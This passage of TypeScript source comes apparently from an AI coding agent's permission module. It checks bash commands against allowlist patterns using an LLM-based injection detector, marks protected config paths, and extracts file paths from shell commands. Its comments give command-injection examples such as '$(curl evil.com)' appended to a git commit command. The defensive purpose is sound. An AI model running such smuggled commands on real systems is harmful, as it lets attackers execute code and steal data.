  // Reject "*" pattern for safety
  if (pattern === '*') return false;

  // Prefix wildcard: "git commit:*" matches "git commit -m 'msg'"
  if (pattern.endsWith(':*')) {
    const prefix = pattern.slice(0, -2);
    return command.startsWith(prefix);
  }

  // Exact match
  return command === pattern;
}

/**
 * Match a pattern against the LLM-extracted SAFE PREFIX of a command
 * (FEATURE_153). The extracted prefix is itself the safe prefix, so
 * matching is exact equality (vs. legacy `startsWith` which let injection
 * sneak past).
 *
 * Examples (where extractedPrefix is the LLM output for the user's command):
 *   command: 'git commit -m "msg"',  extractedPrefix: 'git commit'
 *     pattern 'git commit:*'  → match (prefix === 'git commit')
 *     pattern 'git commit'    → match (exact)
 *     pattern 'git diff:*'    → NO match
 *   command: 'git commit -m "x" $(curl evil)',  extractedPrefix: null
 *     ANY pattern             → NO match (extractor said injection)
 */
function matchesBashPatternByExtractedPrefix(
  extractedPrefix: string,
  pattern: string,
): boolean {
  if (pattern === '*') return false;
  if (pattern.endsWith(':*')) {
    const prefix = pattern.slice(0, -2);
    return extractedPrefix === prefix;
  }
  return extractedPrefix === pattern;
}

/**
 * Check if a tool call is allowed by the user's allowlist patterns.
 *
 * FEATURE_153 (v0.7.38) — When `extractor` is supplied, bash commands are
 * routed through the LLM-backed prefix extractor, which:
 *   - Returns the SAFE PREFIX of the command (e.g. `git commit` for
 *     `git commit -m "msg"`)
 *   - Returns `injection_detected` for inputs containing command injection
 *     (`git commit -m "x" $(curl evil.com)`)
 *   - Returns `no_prefix` when no safe prefix can be determined
 * Patterns then match against the extracted prefix exactly. This eliminates
 * the pre-FEATURE_153 startsWith-based injection surface.
 *
 * When `extractor` is NOT supplied, falls back to the legacy
 * `command.startsWith(pattern)` matcher. Documented as insecure in
 * `matchesBashPatternLegacy` — KodaX's REPL always supplies an extractor in
 * production; the legacy branch exists for tests and headless SDK consumers
 * without LLM access.
 *
 * Note: Only Bash tool is supported for pattern matching.
 *
 * @param toolName — tool name (only "bash" / "Bash" matched)
 * @param input    — tool call input; reads `input.command`
 * @param allowedPatterns — entries like `Bash(git commit:*)` from
 *                          `~/.kodax/config.json` `alwaysAllowTools`
 * @param extractor — optional LLM-backed bash prefix extractor (FEATURE_153)
 * @param signal    — optional abort signal forwarded to the extractor
 */
export async function isToolCallAllowed(
  toolName: string,
  input: Record<string, unknown>,
  allowedPatterns: string[],
  extractor?: BashPrefixExtractor,
  signal?: AbortSignal,
): Promise<boolean> {
  if (toolName.toLowerCase() !== 'bash') {
    return false;
  }

  const command = (input.command as string) ?? '';

  // Determine which patterns are relevant for bash. If none, no LLM call needed.
  const bashPatterns: Array<{ pattern: string | null }> = [];
  for (const entry of allowedPatterns) {
    const parsed = parseAllowedToolPattern(entry);
    if (parsed.tool !== 'bash') continue;
    if (parsed.pattern === null) {
      // Bare `Bash` pattern (no parens content) auto-allows all bash —
      // matches legacy semantics, no extractor call needed.
      return true;
    }
    bashPatterns.push({ pattern: parsed.pattern });
  }
  if (bashPatterns.length === 0) {
    return false;
  }

  // FEATURE_153 path: extract once, match against extracted prefix.
  if (extractor) {
    // Fail-closed on transient extractor failures (timeout / network / abort
    // / invalid provider). The extractor module deliberately throws on these
    // so its LRU cache can evict the failed slot — but that means callers
    // need to handle the throw. We centralise it here so all 4 production
    // call sites (REPL, InkREPL, ACP server, executor.ts) get consistent
    // graceful fallback to the confirmation prompt instead of an unhandled
    // rejection bubbling into the tool-execution loop.
    let result: BashPrefixResult;
    try {
      result = await extractor.extract(command, signal);
    } catch {
      return false;
    }
    if (result.kind !== 'prefix') {
      // injection_detected / no_prefix → no allowlist pattern can match
      // (treat as "user hasn't allowlisted this") so the command falls
      // through to the standard confirmation prompt.
      return false;
    }
    for (const { pattern } of bashPatterns) {
      if (pattern && matchesBashPatternByExtractedPrefix(result.value, pattern)) {
        return true;
      }
    }
    return false;
  }

  // Legacy path: naive startsWith.
  for (const { pattern } of bashPatterns) {
    if (pattern && matchesBashPatternLegacy(command, pattern)) {
      return true;
    }
  }
  return false;
}

/**
 * Generate pattern string for saving
 */
export function generateSavePattern(
  toolName: string,
  input: Record<string, unknown>,
  allowAll: boolean
): string {
  if (toolName.toLowerCase() !== 'bash') {
    return '';
  }

  const command = (input.command as string) ?? '';
  const parts = command.split(' ');

  if (parts.length > 1) {
    const baseCommand = parts.slice(0, 2).join(' ');
    return `Bash(${baseCommand}:*)`;
  }

  return `Bash(${command})`;
}

// ============== Path Checking ==============

/**
 * Check if target path requires always-confirm (permanent protection zones)
 *
 * Protected zones (always require confirmation, regardless of mode):
 * - .kodax/ project config directory
 * - ~/.kodax/ user config directory
 * - Paths outside the project root AND outside the system temp directory
 *
 * System temp directories (`os.tmpdir()` and `$TEMP` / `$TMP` / `$TMPDIR`) are
 * treated as a safe scratchpad in all modes — writing there is auto-allowed.
 * This aligns with plan mode's `isPlanModeAllowedPath` semantics: both modes
 * already explicitly permit system-temp writes, so accept-edits and
 * auto-in-project should not be stricter than plan mode on this dimension.
 */
export function isAlwaysConfirmPath(targetPath: string, projectRoot: string): boolean {
  try {
    const normalizedPath = path.resolve(targetPath);
    const normalizedRoot = path.resolve(projectRoot);
    const userKodaxDir = path.resolve(getAgentConfigHome());
    const projectKodaxDir = path.join(normalizedRoot, '.kodax');

    // .kodax/ project config directory — always protected
    if (isPathInsideDirectory(normalizedPath, projectKodaxDir)) {
      return true;
    }

    // ~/.kodax/ user config directory — always protected
    const canonicalUserKodaxDir = canonicalizeAgentHomePolicyPath(userKodaxDir)
      ?? userKodaxDir;
    const canonicalTarget = canonicalizeAgentHomePolicyPath(normalizedPath);
    if (isPathInsideDirectory(normalizedPath, userKodaxDir)) {
      return canonicalTarget === undefined
        || !isPathInsideDirectory(canonicalTarget, canonicalUserKodaxDir)
        || !isAutoWritableAgentHomePath(canonicalTarget, canonicalUserKodaxDir);
    }
    if (
      canonicalTarget !== undefined
      && isPathInsideDirectory(canonicalTarget, canonicalUserKodaxDir)
    ) {
      return !isAutoWritableAgentHomePath(canonicalTarget, canonicalUserKodaxDir);
    }

    // Inside project — not "always confirm"
    if (isPathInsideDirectory(normalizedPath, normalizedRoot)) {
      return false;
    }

    // Outside project but inside system temp — safe scratchpad, not "always confirm"
    const systemTempDirs = getSystemTempDirectories();
    if (systemTempDirs.some(tempDir => isPathInsideDirectory(normalizedPath, tempDir))) {
      return false;
    }

    // Outside project AND outside system temp — require confirmation
    return true;
  } catch {
    // Path parsing errors should degrade to "not protected" instead of crashing permission checks.
    return false;
  }
}

/**
 * Heuristic: does this argv token look like a file path? Used by
 * `extractPathsFromCommand` to filter post-AST argv tokens. Mirrors the
 * pre-AST regex `pathPattern` plus a "looks-absolute" Windows / POSIX
 * fallback. Quoting is already stripped by AST tokenisation, so this
 * runs against the literal value the shell would see.
 */
function looksLikePath(token: string): boolean {
  if (!token || token.startsWith('-')) {
    return false; // flag, not a path
  }
  // Relative ./ or ../ paths (POSIX or Windows separators)
  if (/^\.\.?[/\\]/.test(token)) return true;
  // Home-relative
  if (token.startsWith('~/') || token.startsWith('~\\')) return true;
  // Windows drive-letter absolute (`C:\foo`)
  if (/^[a-zA-Z]:[/\\]/.test(token)) return true;
  // UNC, extended UNC, and Windows device namespaces. These are path-like
  // even though they do not have a drive letter; the permission analyzer
  // decides separately whether they are safe to access.
  if (/^\\\\/.test(token)) return true;
  // POSIX absolute (`/foo/bar`) — but on Windows, exclude single-letter
  // cmd.exe flag tokens like `findstr /R "v[0-9]"`, `dir /B`, `xcopy /Y`,
  // `where /R`, `fc /B`, `robocopy /MIR`. On Windows these `/X` tokens
  // are virtually always cmd flags; treating them as paths produces the
  // Issue 131 false-positive (path.resolve('/R') → 'C:\R' → triggers
  // protected-path on a non-existent fake path). POSIX behavior
  // unchanged: a `/R` token on Linux/macOS remains a path candidate.
  if (token.startsWith('/') && token.length > 1) {
    if (process.platform === 'win32' && IS_WINDOWS_CMD_FLAG.test(token)) {
      return false;
    }
    return true;
  }
  // Hidden-dir-relative (`.agent/plan_mode_doc.md`) — token has a separator
  // and starts with `.`, but not `..` (already matched above).
  if (token.startsWith('.') && /[/\\]/.test(token)) return true;
  // A normal directory prefix can still escape after normalization, e.g.
  // `subdir/../../outside.txt`. Shape checks must not discard traversal
  // before the executionCwd/projectRoot boundary comparison runs.
  if (token.split(/[/\\]+/).includes('..')) return true;
  return false;
}

/**
 * Windows cmd / PowerShell flag shape: `/X`, `/MIR`, `/A:H`, `/COPY:DAT`.
 * Requires:
 *   - leading `/`
 *   - body is alphanumeric (`A-Za-z0-9`)
 *   - optional `:value` suffix where value is also alphanumeric
 *   - NO further path separators (`/` or `\`) — those would indicate a
 *     real path like `/etc/passwd`
 *
 * Examples MATCHED (treated as flag, NOT path):
 *   /R  /B  /Y  /I  /V  /S  /MIR  /A:H  /D:2024  /COPY:DAT
 * Examples NOT MATCHED (treated as path):
 *   /usr/local/bin  /etc/passwd  /tmp/foo  /R/file  /A:H/sub
 */
const IS_WINDOWS_CMD_FLAG = /^\/[A-Za-z][A-Za-z0-9]*(?::[A-Za-z0-9]+)?$/;

const INLINE_SCRIPT_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  python: new Set(['-c']),
  py: new Set(['-c']),
  node: new Set(['-e', '--eval', '-p', '--print']),
  ruby: new Set(['-e']),
  perl: new Set(['-e']),
};
const REGEX_SOURCE_COMMANDS: ReadonlySet<string> = new Set([
  'rg',
  'ripgrep',
  'grep',
  'egrep',
  'fgrep',
  'findstr',
  'select-string',
  'sls',
  'sed',
  'awk',
]);
const EXPLICIT_REGEX_FLAGS: ReadonlySet<string> = new Set([
  '-e',
  '--regexp',
  '--regex',
  '-pattern',
]);
const REGEX_SOURCE_FILE_FLAGS: ReadonlySet<string> = new Set(['-f', '--file']);
const RG_SOURCE_VALUE_FLAGS: ReadonlySet<string> = new Set([
  '-g',
  '--glob',
  '--iglob',
  '-r',
  '--replace',
]);
const GREP_SOURCE_VALUE_FLAGS: ReadonlySet<string> = new Set([
  '--include',
  '--exclude',
  '--exclude-dir',
]);
const REGEX_SOURCE_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  rg: RG_SOURCE_VALUE_FLAGS,
  ripgrep: RG_SOURCE_VALUE_FLAGS,
  grep: GREP_SOURCE_VALUE_FLAGS,
  egrep: GREP_SOURCE_VALUE_FLAGS,
  fgrep: GREP_SOURCE_VALUE_FLAGS,
  awk: new Set(['-v', '--assign']),
  'select-string': new Set(['-inputobject']),
};
const REGEX_PATH_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  rg: new Set(['--ignore-file']),
  ripgrep: new Set(['--ignore-file']),
  grep: new Set(['--exclude-from']),
  egrep: new Set(['--exclude-from']),
  fgrep: new Set(['--exclude-from']),
  'select-string': new Set(['-path', '-literalpath']),
};
const POWERSHELL_SELECT_STRING_PARAMETERS = [
  'path', 'literalpath', 'include', 'exclude', 'pattern', 'simplematch',
  'casesensitive', 'quiet', 'list', 'allmatches', 'notmatch', 'encoding',
  'context', 'raw', 'culture', 'inputobject', 'noemphasis',
  'verbose', 'debug', 'erroraction', 'warningaction', 'informationaction',
  'errorvariable', 'warningvariable', 'informationvariable', 'outvariable',
  'outbuffer', 'pipelinevariable', 'progressaction',
] as const;
const POWERSHELL_SELECT_STRING_SWITCHES = new Set([
  'simplematch', 'casesensitive', 'quiet', 'list', 'allmatches', 'notmatch',
  'raw', 'noemphasis', 'verbose', 'debug',
]);
const POWERSHELL_SELECT_STRING_PARAMETER_ALIASES: Readonly<Record<string, string>> = {
  pspath: 'literalpath',
  vb: 'verbose',
  db: 'debug',
  ea: 'erroraction',
  wa: 'warningaction',
  infa: 'informationaction',
  ev: 'errorvariable',
  wv: 'warningvariable',
  iv: 'informationvariable',
  ov: 'outvariable',
  ob: 'outbuffer',
  pv: 'pipelinevariable',
};
const GIT_CONFIG_PATH_VALUE_FLAGS = new Set(['-f', '--file', '--blob']);
const GIT_READ_NON_PATH_VALUE_OPTIONS = new Set([
  '-g', '-s', '--format', '--pretty', '--date', '--encoding', '--diff-algorithm',
  '--word-diff-regex', '--diff-filter', '--find-object', '--line-prefix',
  '--src-prefix', '--dst-prefix', '--grep', '--author', '--committer', '--since',
  '--after', '--until', '--before', '--max-count', '-n', '--skip',
  '--min-parents', '--max-parents', '--inter-hunk-context', '--anchored',
]);
const GIT_GREP_NON_PATH_VALUE_OPTIONS = new Set([
  '--max-count', '--after-context', '--before-context', '--context', '--threads',
]);

function commandBasename(value: string): string {
  const normalized = value.replace(/\\/g, '/');
  return (normalized.split('/').pop() ?? normalized).toLowerCase().replace(/\.exe$/, '');
}

interface CommandArgumentRoles {
  readonly sourceIndexes: Set<number>;
  readonly pathIndexes: Set<number>;
  readonly pathValues: Set<string>;
}

function createCommandArgumentRoles(): CommandArgumentRoles {
  return {
    sourceIndexes: new Set<number>(),
    pathIndexes: new Set<number>(),
    pathValues: new Set<string>(),
  };
}

function addIndexedValue(
  argv: readonly string[],
  index: number,
  indexes: Set<number>,
  values?: Set<string>,
): void {
  const value = argv[index];
  if (value === undefined) return;
  indexes.add(index);
  values?.add(value);
}

function addGitPathCandidate(
  argv: readonly string[],
  index: number,
  roles: CommandArgumentRoles,
): void {
  const value = argv[index];
  if (!value) return;
  const environmentPath = /^%[A-Za-z_][A-Za-z0-9_]*%[/\\]/.test(value)
    || /^\$(?:env:)?(?:\{[A-Za-z_][A-Za-z0-9_]*\}|[A-Za-z_][A-Za-z0-9_]*)[/\\]/i.test(value);
  const shellPathExpansion = /[*?[\]]/.test(value) || /\{[^{}]*,[^{}]*\}/.test(value);
  if (looksLikePath(value) || environmentPath || shellPathExpansion) {
    addIndexedValue(argv, index, roles.pathIndexes, roles.pathValues);
  }
}

function attachedOptionValue(token: string, flag: string): string | undefined {
  const lower = token.toLowerCase();
  if (flag.startsWith('--')) {
    const prefix = `${flag}=`;
    return lower.startsWith(prefix) ? token.slice(prefix.length) : undefined;
  }
  return lower.startsWith(flag) && token.length > flag.length
    ? token.slice(flag.length)
    : undefined;
}

function collectScriptSourceRoles(
  argv: readonly string[],
  flags: ReadonlySet<string>,
  roles: CommandArgumentRoles,
): void {
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    const lower = token.toLowerCase();
    for (const flag of flags) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, roles.sourceIndexes);
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        roles.sourceIndexes.add(index);
        break;
      }
    }
  }
}

function collectFlagValueRoles(
  argv: readonly string[],
  flags: ReadonlySet<string> | undefined,
  indexes: Set<number>,
  values?: Set<string>,
): void {
  if (!flags) return;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') break;
    const lower = token.toLowerCase();
    for (const flag of flags) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, indexes, values);
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        indexes.add(index);
        values?.add(attached);
        break;
      }
    }
  }
}

function collectGitGrepArgumentRoles(
  argv: readonly string[],
  subcommandIndex: number,
  roles: CommandArgumentRoles,
): void {
  let patternSeen = false;
  let optionsEnded = false;
  for (let index = subcommandIndex + 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') {
      optionsEnded = true;
      continue;
    }
    const lower = token.toLowerCase();
    if (!optionsEnded && lower === '--file') {
      addIndexedValue(argv, index + 1, roles.pathIndexes, roles.pathValues);
      patternSeen = true;
      index += 1;
      continue;
    }
    if (!optionsEnded && lower.startsWith('--file=')) {
      roles.pathIndexes.add(index);
      roles.pathValues.add(token.slice(token.indexOf('=') + 1));
      patternSeen = true;
      continue;
    }
    if (!optionsEnded && (lower === '--regexp' || lower === '-e')) {
      addIndexedValue(argv, index + 1, roles.sourceIndexes);
      patternSeen = true;
      index += 1;
      continue;
    }
    if (!optionsEnded && lower.startsWith('--regexp=')) {
      roles.sourceIndexes.add(index);
      patternSeen = true;
      continue;
    }
    if (!optionsEnded && GIT_GREP_NON_PATH_VALUE_OPTIONS.has(lower)) {
      addIndexedValue(argv, index + 1, roles.sourceIndexes);
      index += 1;
      continue;
    }
    if (!optionsEnded) {
      const shortOption = parseGitGrepShortOption(token);
      if (shortOption.valueKind === 'pattern-file') {
        if (shortOption.attachedValue !== undefined) {
          roles.pathIndexes.add(index);
          roles.pathValues.add(shortOption.attachedValue);
        } else {
          addIndexedValue(argv, index + 1, roles.pathIndexes, roles.pathValues);
          index += 1;
        }
        patternSeen = true;
        continue;
      }
      if (shortOption.valueKind === 'pattern') {
        if (shortOption.attachedValue !== undefined) roles.sourceIndexes.add(index);
        else {
          addIndexedValue(argv, index + 1, roles.sourceIndexes);
          index += 1;
        }
        patternSeen = true;
        continue;
      }
      if (shortOption.valueKind === 'other') {
        if (shortOption.consumesNext) {
          addIndexedValue(argv, index + 1, roles.sourceIndexes);
          index += 1;
        }
        continue;
      }
      if (token.startsWith('-')) continue;
    }
    if (!patternSeen) {
      roles.sourceIndexes.add(index);
      patternSeen = true;
      continue;
    }
    addGitPathCandidate(argv, index, roles);
  }
}

function collectGitReadPathRoles(
  argv: readonly string[],
  subcommandIndex: number,
  roles: CommandArgumentRoles,
): void {
  let pathsOnly = false;
  for (let index = subcommandIndex + 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') {
      pathsOnly = true;
      continue;
    }
    if (!pathsOnly && GIT_READ_NON_PATH_VALUE_OPTIONS.has(token.toLowerCase())) {
      addIndexedValue(argv, index + 1, roles.sourceIndexes);
      index += 1;
      continue;
    }
    if (!pathsOnly && token.startsWith('-')) continue;
    addGitPathCandidate(argv, index, roles);
  }
}

function resolvePowerShellSelectStringParameter(token: string): {
  readonly name: string;
  readonly attachedValue?: string;
} | undefined {
  const match = /^-([^:]+)(?::(.*))?$/s.exec(token);
  if (!match) return undefined;
  const prefix = match[1]?.toLowerCase() ?? '';
  const alias = POWERSHELL_SELECT_STRING_PARAMETER_ALIASES[prefix];
  const candidates = alias
    ? [alias]
    : POWERSHELL_SELECT_STRING_PARAMETERS.filter((name) => name.startsWith(prefix));
  if (candidates.length !== 1) return undefined;
  return {
    name: candidates[0]!,
    ...(match[2] !== undefined ? { attachedValue: match[2] } : {}),
  };
}

function collectPowerShellSelectStringArgumentRoles(
  argv: readonly string[],
  roles: CommandArgumentRoles,
): void {
  let patternBound = false;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    const parameter = resolvePowerShellSelectStringParameter(token);
    if (parameter) {
      if (POWERSHELL_SELECT_STRING_SWITCHES.has(parameter.name)) continue;
      const valueIndex = parameter.attachedValue === undefined ? index + 1 : index;
      const value = parameter.attachedValue ?? argv[valueIndex];
      if (value === undefined) continue;
      if (parameter.name === 'path' || parameter.name === 'literalpath') {
        roles.pathIndexes.add(valueIndex);
        roles.pathValues.add(value);
      } else {
        roles.sourceIndexes.add(valueIndex);
      }
      if (parameter.name === 'pattern') patternBound = true;
      if (parameter.attachedValue === undefined) index += 1;
      continue;
    }
    if (token.startsWith('-')) continue;
    if (!patternBound) {
      roles.sourceIndexes.add(index);
      patternBound = true;
      continue;
    }
    addIndexedValue(argv, index, roles.pathIndexes, roles.pathValues);
  }
}

function collectRegexArgumentRoles(argv: readonly string[], roles: CommandArgumentRoles): void {
  const command = commandBasename(argv[0] ?? '');
  if (command === 'select-string' || command === 'sls') {
    collectPowerShellSelectStringArgumentRoles(argv, roles);
    return;
  }
  collectFlagValueRoles(
    argv,
    REGEX_SOURCE_VALUE_FLAGS[command],
    roles.sourceIndexes,
  );
  collectFlagValueRoles(
    argv,
    REGEX_PATH_VALUE_FLAGS[command],
    roles.pathIndexes,
    roles.pathValues,
  );
  let hasExplicitPattern = false;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') break;
    const lower = token.toLowerCase();
    if (command === 'findstr' && lower.startsWith('/f:')) {
      roles.pathIndexes.add(index);
      roles.pathValues.add(token.slice(3));
      continue;
    }
    if (command === 'findstr' && lower.startsWith('/c:')) {
      roles.sourceIndexes.add(index);
      hasExplicitPattern = true;
      continue;
    }
    if (command === 'findstr' && lower.startsWith('/g:')) {
      roles.pathIndexes.add(index);
      roles.pathValues.add(token.slice(3));
      hasExplicitPattern = true;
      continue;
    }
    for (const flag of EXPLICIT_REGEX_FLAGS) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, roles.sourceIndexes);
        hasExplicitPattern = true;
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        roles.sourceIndexes.add(index);
        hasExplicitPattern = true;
        break;
      }
    }
    for (const flag of REGEX_SOURCE_FILE_FLAGS) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, roles.pathIndexes, roles.pathValues);
        hasExplicitPattern = true;
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        roles.pathValues.add(attached);
        hasExplicitPattern = true;
        break;
      }
    }
  }
  if (!hasExplicitPattern) {
    let optionsEnded = false;
    for (let index = 1; index < argv.length; index += 1) {
      const token = argv[index] ?? '';
      if (token === '--') {
        optionsEnded = true;
        continue;
      }
      if (roles.sourceIndexes.has(index) || roles.pathIndexes.has(index)) continue;
      if (!optionsEnded && token.startsWith('-')) continue;
      if (command === 'findstr' && IS_WINDOWS_CMD_FLAG.test(token)) continue;
      addIndexedValue(argv, index, roles.sourceIndexes);
      break;
    }
  }
  let optionsEnded = false;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') {
      optionsEnded = true;
      continue;
    }
    if (
      (!optionsEnded && token.startsWith('-'))
      || roles.sourceIndexes.has(index)
      || roles.pathIndexes.has(index)
    ) continue;
    if (command === 'findstr' && IS_WINDOWS_CMD_FLAG.test(token)) continue;
    addIndexedValue(argv, index, roles.pathIndexes, roles.pathValues);
  }
}

function collectTreeFileListRoles(
  argv: readonly string[],
  roles: CommandArgumentRoles,
): void {
  const fromFileMode = argv.slice(1).some((token) => /^--from(?:tab)?file(?:=|$)/i.test(token));
  if (!fromFileMode) return;
  let optionsEnded = false;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    const attachedInput = /^--from(?:tab)?file=(.*)$/i.exec(token)?.[1];
    if (attachedInput !== undefined) {
      roles.pathIndexes.add(index);
      if (attachedInput) roles.pathValues.add(attachedInput);
      continue;
    }
    if (/^--from(?:tab)?file$/i.test(token) || token === '--') {
      roles.sourceIndexes.add(index);
      if (token === '--') optionsEnded = true;
      continue;
    }
    if (!optionsEnded && /^-[^-]/.test(token)) {
      const body = token.slice(1);
      const valueIndex = [...body].findIndex((option) => (
        TREE_SHORT_VALUE_OPTIONS.has(option) || TREE_OUTPUT_OPTIONS.has(option)
      ));
      roles.sourceIndexes.add(index);
      if (valueIndex >= 0 && body.slice(valueIndex + 1).length === 0) {
        const output = TREE_OUTPUT_OPTIONS.has(body[valueIndex] ?? '');
        addIndexedValue(
          argv,
          index + 1,
          output ? roles.pathIndexes : roles.sourceIndexes,
          output ? roles.pathValues : undefined,
        );
        index += 1;
      }
      continue;
    }
    if (!optionsEnded && token.startsWith('--')) {
      const option = token.split('=', 1)[0]?.toLowerCase() ?? '';
      roles.sourceIndexes.add(index);
      if (TREE_LONG_VALUE_OPTIONS.has(option) && !token.includes('=')) {
        const output = option === '--output';
        addIndexedValue(
          argv,
          index + 1,
          output ? roles.pathIndexes : roles.sourceIndexes,
          output ? roles.pathValues : undefined,
        );
        index += 1;
      }
      continue;
    }
    addIndexedValue(argv, index, roles.pathIndexes, roles.pathValues);
  }
}

function collectCommandArgumentRoles(argv: readonly string[]): CommandArgumentRoles {
  const roles = createCommandArgumentRoles();
  const command = commandBasename(argv[0] ?? '');
  if (command === 'git') {
    const subcommandIndex = consumeGitGlobalOptions(
      argv,
      roles.pathIndexes,
      roles.pathValues,
    );
    const subcommand = subcommandIndex === undefined
      ? undefined
      : argv[subcommandIndex]?.toLowerCase();
    if (subcommandIndex !== undefined && subcommand === 'grep') {
      collectGitGrepArgumentRoles(argv, subcommandIndex, roles);
    } else if (subcommandIndex !== undefined
      && (subcommand === 'diff' || subcommand === 'log' || subcommand === 'show')) {
      collectGitReadPathRoles(argv, subcommandIndex, roles);
    } else if (subcommand === 'config') {
      collectFlagValueRoles(
        argv,
        GIT_CONFIG_PATH_VALUE_FLAGS,
        roles.pathIndexes,
        roles.pathValues,
      );
    }
  }
  const scriptFlags = /^python(?:\d+(?:\.\d+)*)?$/.test(command)
    ? INLINE_SCRIPT_FLAGS.python
    : INLINE_SCRIPT_FLAGS[command];
  if (scriptFlags) collectScriptSourceRoles(argv, scriptFlags, roles);
  if (REGEX_SOURCE_COMMANDS.has(command)) collectRegexArgumentRoles(argv, roles);
  if (command === 'tree') collectTreeFileListRoles(argv, roles);
  return roles;
}

/**
 * Pre-AST regex-based path scanner. Retained as a complementary pass
 * because shell-quote's POSIX tokenisation eats Windows backslash escapes:
 *   `rm C:\Users\foo\bar.txt` → AST argv is `['rm', 'C:Users', 'oo\bar.txt']`
 *                               (the `\U`, `\f`, `\b` are POSIX-escape-stripped).
 * The regex sees raw input and recognises `C:\foo`-style paths as one
 * coherent token, which is what callers (`isCommandOnProtectedPath`,
 * `collectBashWriteTargets`) actually need to make path-safety decisions.
 *
 * Pre-AST regex was the entire impl; here it's a Windows-path safety net
 * layered ON TOP of the AST argv pass. Tokens recognised by both are
 * de-duped at the `Set` level by the caller.
 */
export interface RawCommandWord {
  readonly value: string;
  readonly start: number;
  readonly end: number;
}

export function tokenizeRawCommandStages(command: string): readonly RawCommandWord[][] {
  const stages: RawCommandWord[][] = [];
  let words: RawCommandWord[] = [];
  let value = '';
  let start = -1;
  let quote: '"' | "'" | undefined;
  const finishWord = (end: number): void => {
    if (start < 0) return;
    words.push({ value, start, end });
    value = '';
    start = -1;
  };
  const finishStage = (): void => {
    if (words.length > 0) stages.push(words);
    words = [];
  };
  for (let index = 0; index < command.length; index += 1) {
    const char = command[index]!;
    if (quote) {
      if (char === quote) {
        quote = undefined;
      } else if (quote === '"' && char === '\\' && command[index + 1] === '"') {
        value += `${char}${command[index + 1]}`;
        index += 1;
      } else {
        value += char;
      }
      continue;
    }
    if (char === '"' || char === "'") {
      if (start < 0) start = index;
      quote = char;
    } else if (/\s/.test(char)) {
      finishWord(index);
    } else if (char === '|' || char === '&' || char === ';') {
      finishWord(index);
      finishStage();
    } else {
      if (start < 0) start = index;
      value += char;
    }
  }
  if (quote) return [];
  finishWord(command.length);
  finishStage();
  return stages;
}

function maskRawInlineSources(command: string): string {
  // String offsets above are UTF-16 code-unit indexes; split the same way so
  // non-BMP text before a source argument cannot shift the masked range.
  const masked = command.split('');
  for (const words of tokenizeRawCommandStages(command)) {
    const roles = collectCommandArgumentRoles(words.map((word) => word.value));
    for (const index of roles.sourceIndexes) {
      const word = words[index];
      if (!word) continue;
      for (let offset = word.start; offset < word.end; offset += 1) masked[offset] = ' ';
    }
  }
  return masked.join('');
}

function legacyRegexPathScan(command: string): string[] {
  const out: string[] = [];

  let m: RegExpExecArray | null;
  // Preserve quoted Windows paths with spaces without recovering arbitrary
  // quoted source/regex fragments as paths.
  for (const pattern of [/"([A-Za-z]:\\[^"\r\n]+)"/g, /'([A-Za-z]:\\[^'\r\n]+)'/g]) {
    while ((m = pattern.exec(command)) !== null) {
      out.push(m[1]!);
    }
  }

  // Common path patterns (mirrors pre-AST `pathPattern` exactly so we
  // preserve identification of `./foo`, `../foo`, `C:\foo`, `~/foo`,
  // `.x/foo`)
  const pathPattern = /(?:^|\s)(\.\.?\/[^\s]+|\.\.?\\[^\s]+|~\/[^\s]+|\.[^\s]*[/\\][^\s]*)/g;
  while ((m = pathPattern.exec(command)) !== null) {
    out.push(m[1]!);
  }
  // Raw Windows paths need a wider left boundary for attached path options
  // such as `findstr /G:C:\patterns.txt`; inline source ranges were masked
  // before this pass, so matching after `=` or `:` cannot recover code text.
  const windowsPathPattern = /(?:^|[\s:=<>])([a-zA-Z]:\\[^\s"'|;&<>]+)/g;
  while ((m = windowsPathPattern.exec(command)) !== null) {
    out.push(m[1]!);
  }
  return out;
}

/**
 * Extract potential file paths from a bash command. Used to check whether
 * a bash invocation operates on protected paths (`isCommandOnProtectedPath`)
 * and as a "wide net" feeder into `collectBashWriteTargets`.
 *
 * FEATURE_152 (v0.7.38): hybrid AST + legacy-regex pass:
 *   1. AST tokenisation for argv — gives correctly unquoted paths,
 *      including paths with spaces (`"path with spaces.txt"`). Pre-AST
 *      regex needed quotes literally present in input.
 *   2. Legacy regex pass for Windows backslash paths — shell-quote treats
 *      `\` as POSIX escape so `C:\Users\foo` mangles into `C:Users`.
 *      The regex recognises the raw Windows path token before tokenisation.
 *
 * Both passes contribute; results de-duplicate via `Set` at the call site.
 *
 * Issue 052: original purpose — gate "always allow" on bash commands that
 * touch protected paths.
 */
export function extractPathsFromCommand(command: string): string[] {
  const paths = new Set<string>();
  const tree = parseBashCommand(command);
  if (tree.unparseable) return [];

  // The Runtime shell on Windows is cmd/PowerShell-flavoured, while the AST
  // tokenizer deliberately follows POSIX quoting. Read path roles from the raw
  // words on every platform so Windows-style paths (`%TEMP%\x`, `C:\x`,
  // `%USERPROFILE%\.ssh`) retain their backslashes: shell-quote's POSIX
  // tokenisation eats the `\.` escape, which would otherwise hide the
  // protected `.ssh` segment (git path-option it.each, ubuntu node 20).
  for (const words of tokenizeRawCommandStages(command)) {
    const values = words.map((word) => word.value);
    const roles = collectCommandArgumentRoles(values);
    for (const value of roles.pathValues) paths.add(value);
    // The looksLikePath fallback stays win32-only: on POSIX the AST pass
